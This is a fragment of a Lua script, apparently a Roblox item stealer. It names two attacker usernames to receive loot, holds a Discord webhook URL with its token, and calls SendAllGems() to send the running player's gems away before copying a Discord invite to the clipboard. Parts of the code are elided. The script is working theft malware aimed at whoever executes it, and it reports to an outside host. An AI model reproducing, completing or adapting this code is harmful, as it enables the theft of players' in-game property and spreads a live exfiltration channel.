Username = "Darkxlopz"
Username2 = "SANTORYU_HUGI" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1279604638798057473/8JKoQx1oxZg-xq4Bj1ddNIs0G1zfduRcRQtUvtDJlemjZ_JgKvbtJR4XMV_u2N9JW2xR"
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    SendAllGems()
    setclipboard("https://discord.gg/ZV52aFWyWm")
